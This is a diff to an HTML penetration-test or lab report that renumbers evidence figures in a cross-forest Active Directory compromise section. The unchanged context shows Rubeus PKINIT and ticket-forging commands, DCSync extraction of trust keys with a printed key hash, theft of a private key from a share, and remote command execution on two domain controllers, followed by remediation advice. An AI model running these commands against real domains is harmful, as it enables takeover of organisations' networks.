@@ -156,16 +156,17 @@
     <li><a href="#figure-62" class="ref ref-figure"><span class="ref-title">Converting the enrollment-agent certificate to PFX</span></a></li>
     <li><a href="#figure-63" class="ref ref-figure"><span class="ref-title">On-behalf-of certificate issued for the Domain Admin techadmin</span></a></li>
     <li><a href="#figure-64" class="ref ref-figure"><span class="ref-title">Converting the techadmin certificate to PFX</span></a></li>
-    <li><a href="#figure-65" class="ref ref-figure"><span class="ref-title">Domain Admin TGT via PKINIT and OS command execution on TECH-DC</span></a></li>
-    <li><a href="#figure-66" class="ref ref-figure"><span class="ref-title">Inter-realm trust keys extracted via DCSync</span></a></li>
-    <li><a href="#figure-67" class="ref ref-figure"><span class="ref-title">lsadump::evasive-trust /patch: In / Out inter-realm trust keys</span></a></li>
-    <li><a href="#figure-68" class="ref ref-figure"><span class="ref-title">DCSync of tech\krbtgt (hash used in the superseded attempt)</span></a></li>
-    <li><a href="#figure-69" class="ref ref-figure"><span class="ref-title">Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket</span></a></li>
-    <li><a href="#figure-70" class="ref ref-figure"><span class="ref-title">CIFS service ticket obtained; TechOperations share lists finadmin.pem</span></a></li>
-    <li><a href="#figure-71" class="ref ref-figure"><span class="ref-title">Unencrypted finadmin.pem stolen from the cross-forest share and converted</span></a></li>
-    <li><a href="#figure-72" class="ref ref-figure"><span class="ref-title">PKINIT as finadmin: Domain Admin TGT issued for finance.corp</span></a></li>
-    <li><a href="#figure-73" class="ref ref-figure"><span class="ref-title">PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</span></a></li>
-    <li><a href="#figure-74" class="ref ref-figure"><span class="ref-title">Final objective flag read on FINANCE-DC as finadmin</span></a></li>
+    <li><a href="#figure-65" class="ref ref-figure"><span class="ref-title">PKINIT with the techadmin certificate: Domain Admin TGT issued (krbtgt/tech.corp)</span></a></li>
+    <li><a href="#figure-66" class="ref ref-figure"><span class="ref-title">Domain Admin TGT via PKINIT and OS command execution on TECH-DC</span></a></li>
+    <li><a href="#figure-67" class="ref ref-figure"><span class="ref-title">Inter-realm trust keys extracted via DCSync</span></a></li>
+    <li><a href="#figure-68" class="ref ref-figure"><span class="ref-title">lsadump::evasive-trust /patch: In / Out inter-realm trust keys</span></a></li>
+    <li><a href="#figure-69" class="ref ref-figure"><span class="ref-title">DCSync of tech\krbtgt (hash used in the superseded attempt)</span></a></li>
+    <li><a href="#figure-70" class="ref ref-figure"><span class="ref-title">Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket</span></a></li>
+    <li><a href="#figure-71" class="ref ref-figure"><span class="ref-title">CIFS service ticket obtained; TechOperations share lists finadmin.pem</span></a></li>
+    <li><a href="#figure-72" class="ref ref-figure"><span class="ref-title">Unencrypted finadmin.pem stolen from the cross-forest share and converted</span></a></li>
+    <li><a href="#figure-73" class="ref ref-figure"><span class="ref-title">PKINIT as finadmin: Domain Admin TGT issued for finance.corp</span></a></li>
+    <li><a href="#figure-74" class="ref ref-figure"><span class="ref-title">PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</span></a></li>
+    <li><a href="#figure-75" class="ref ref-figure"><span class="ref-title">Final objective flag read on FINANCE-DC as finadmin</span></a></li>
   </ul>
 </section>
 <pagebreak />
@@ -868,6 +869,7 @@ PFX:</p>
   /domain:tech.corp /dc:tech-dc.tech.corp /ptt /nowrap
 # UserName : techadmin (NT_PRINCIPAL)   -&gt;  ticket for krbtgt/tech.corp
 </code></pre>
+<figure id="figure-65" class="evidence"><img alt="PKINIT with the techadmin certificate: Domain Admin TGT issued (krbtgt/tech.corp)" class="evidence" src="images/img64.png"><figcaption>PKINIT with the techadmin certificate: Domain Admin TGT issued (krbtgt/tech.corp)</figcaption></figure>
 <p>Confirm operating-system-level command execution on the domain controller as
 <code>techadmin</code>, satisfying the scope objective for TECH-DC:</p>
 <pre><code class="language-text">klist
@@ -876,7 +878,7 @@ winrs -r:tech-dc.tech.corp &quot;whoami &amp;&amp; hostname&quot;
 #  tech\techadmin
 #  tech-dc
 </code></pre>
-<figure id="figure-65" class="evidence"><img alt="Domain Admin TGT via PKINIT and OS command execution on TECH-DC" class="evidence" src="images/img65.png"><figcaption>Domain Admin TGT via PKINIT and OS command execution on TECH-DC</figcaption></figure>
+<figure id="figure-66" class="evidence"><img alt="Domain Admin TGT via PKINIT and OS command execution on TECH-DC" class="evidence" src="images/img65.png"><figcaption>Domain Admin TGT via PKINIT and OS command execution on TECH-DC</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li>Remove the <strong>Certificate Request Agent</strong> EKU from the <code>FIDO</code> template, or
@@ -932,9 +934,9 @@ keys and the <code>krbtgt</code> hash:</p>
 <pre><code class="language-text">[ In ] TECH.CORP -&gt; FINANCE.CORP
   rc4_hmac_nt   a0ba8caa534fc2f186ca86ea7b5cee6e     &lt;-- inter-realm trust key
 </code></pre>
-<figure id="figure-66" class="evidence"><img alt="Inter-realm trust keys extracted via DCSync" class="evidence" src="images/img67.png"><figcaption>Inter-realm trust keys extracted via DCSync</figcaption></figure>
-<figure id="figure-67" class="evidence"><img alt="lsadump::evasive-trust /patch: In / Out inter-realm trust keys" class="evidence" src="images/img66.png"><figcaption>lsadump::evasive-trust /patch: In / Out inter-realm trust keys</figcaption></figure>
-<figure id="figure-68" class="evidence"><img alt="DCSync of tech\krbtgt (hash used in the superseded attempt)" class="evidence" src="images/img68.png"><figcaption>DCSync of tech\krbtgt (hash used in the superseded attempt)</figcaption></figure>
+<figure id="figure-67" class="evidence"><img alt="Inter-realm trust keys extracted via DCSync" class="evidence" src="images/img67.png"><figcaption>Inter-realm trust keys extracted via DCSync</figcaption></figure>
+<figure id="figure-68" class="evidence"><img alt="lsadump::evasive-trust /patch: In / Out inter-realm trust keys" class="evidence" src="images/img66.png"><figcaption>lsadump::evasive-trust /patch: In / Out inter-realm trust keys</figcaption></figure>
+<figure id="figure-69" class="evidence"><img alt="DCSync of tech\krbtgt (hash used in the superseded attempt)" class="evidence" src="images/img68.png"><figcaption>DCSync of tech\krbtgt (hash used in the superseded attempt)</figcaption></figure>
 <p><strong>Attempted approach (blocked by SID filtering).</strong> A cross-forest Golden
 Ticket using the <code>tech\krbtgt</code> hash with SID history for <code>finance.corp</code>
 Enterprise Admins (RID 519) was rejected by the quarantined trust:</p>
@@ -957,8 +959,8 @@ impersonating the native <code>finance.corp</code> administrator <code>finadmin<
 <pre><code class="language-powershell">.\Rubeus.exe asktgs /ticket:finadmin_in.kirbi `
   /service:cifs/finance-dc.finance.corp /dc:finance-dc.finance.corp /ptt /nowrap
 </code></pre>
-<figure id="figure-69" class="evidence"><img alt="Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket" class="evidence" src="images/img69.png"><figcaption>Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket</figcaption></figure>
-<figure id="figure-70" class="evidence"><img alt="CIFS service ticket obtained; TechOperations share lists finadmin.pem" class="evidence" src="images/img70.png"><figcaption>CIFS service ticket obtained; TechOperations share lists finadmin.pem</figcaption></figure>
+<figure id="figure-70" class="evidence"><img alt="Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket" class="evidence" src="images/img69.png"><figcaption>Inter-realm TGT forged for finadmin and exchanged for a CIFS ticket</figcaption></figure>
+<figure id="figure-71" class="evidence"><img alt="CIFS service ticket obtained; TechOperations share lists finadmin.pem" class="evidence" src="images/img70.png"><figcaption>CIFS service ticket obtained; TechOperations share lists finadmin.pem</figcaption></figure>
 <p>Access the cross-forest share; it exposes an <strong>unencrypted</strong> private key
 <code>finadmin.pem</code>. The <code>openssl</code> conversion only prompts for an <em>export</em>
 password (the one being set), never an <em>import</em> password, proving the PEM
@@ -971,14 +973,14 @@ copy \\finance-dc.finance.corp\TechOperations\finadmin.pem `
   -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out finadmin.pfx
 # Enter Export Password:  &lt;-- only an EXPORT prompt: the PEM key was unencrypted
 </code></pre>
-<figure id="figure-71" class="evidence"><img alt="Unencrypted finadmin.pem stolen from the cross-forest share and converted" class="evidence" src="images/img71.png"><figcaption>Unencrypted finadmin.pem stolen from the cross-forest share and converted</figcaption></figure>
+<figure id="figure-72" class="evidence"><img alt="Unencrypted finadmin.pem stolen from the cross-forest share and converted" class="evidence" src="images/img71.png"><figcaption>Unencrypted finadmin.pem stolen from the cross-forest share and converted</figcaption></figure>
 <p>Authenticate as <code>finadmin</code> with <strong>PKINIT</strong>, spawning a fresh logon session
 via <code>/createnetonly</code> and injecting the TGT into it:</p>
 <pre><code class="language-powershell">.\Rubeus.exe asktgt /user:finadmin /certificate:.\finadmin.pfx /password:&lt;pfx-password&gt; `
   /domain:finance.corp /dc:finance-dc.finance.corp `
   /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 </code></pre>
-<figure id="figure-72" class="evidence"><img alt="PKINIT as finadmin: Domain Admin TGT issued for finance.corp" class="evidence" src="images/img72.png"><figcaption>PKINIT as finadmin: Domain Admin TGT issued for finance.corp</figcaption></figure>
+<figure id="figure-73" class="evidence"><img alt="PKINIT as finadmin: Domain Admin TGT issued for finance.corp" class="evidence" src="images/img72.png"><figcaption>PKINIT as finadmin: Domain Admin TGT issued for finance.corp</figcaption></figure>
 <p>Verify the ticket, confirm remote access, and read the <strong>final flag</strong>
 locally on FINANCE-DC:</p>
 <pre><code class="language-powershell">klist
@@ -988,13 +990,13 @@ winrs -r:finance-dc.finance.corp &quot;whoami &amp;&amp; hostname&quot;
 #  finance\finadmin
 #  finance-dc
 </code></pre>
-<figure id="figure-73" class="evidence"><img alt="PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin" class="evidence" src="images/img73.png"><figcaption>PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</figcaption></figure>
+<figure id="figure-74" class="evidence"><img alt="PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin" class="evidence" src="images/img73.png"><figcaption>PKINIT TGT verified and OS command execution on FINANCE-DC as finadmin</figcaption></figure>
 <pre><code class="language-text">winrs -r:finance-dc.finance.corp cmd
 C:\Users\finadmin&gt; cd Desktop
 C:\Users\finadmin\Desktop&gt; type finalflag.txt
 64061b82-fb44-48d5-b2d2-761766634e30
 </code></pre>
-<figure id="figure-74" class="evidence"><img alt="Final objective flag read on FINANCE-DC as finadmin" class="evidence" src="images/img74.png"><figcaption>Final objective flag read on FINANCE-DC as finadmin</figcaption></figure>
+<figure id="figure-75" class="evidence"><img alt="Final objective flag read on FINANCE-DC as finadmin" class="evidence" src="images/img74.png"><figcaption>Final objective flag read on FINANCE-DC as finadmin</figcaption></figure>
     <h3>Recommendations</h3>
 <ul>
 <li><strong>Enforce SID filtering / selective authentication</strong> on the <code>finance.corp</code>
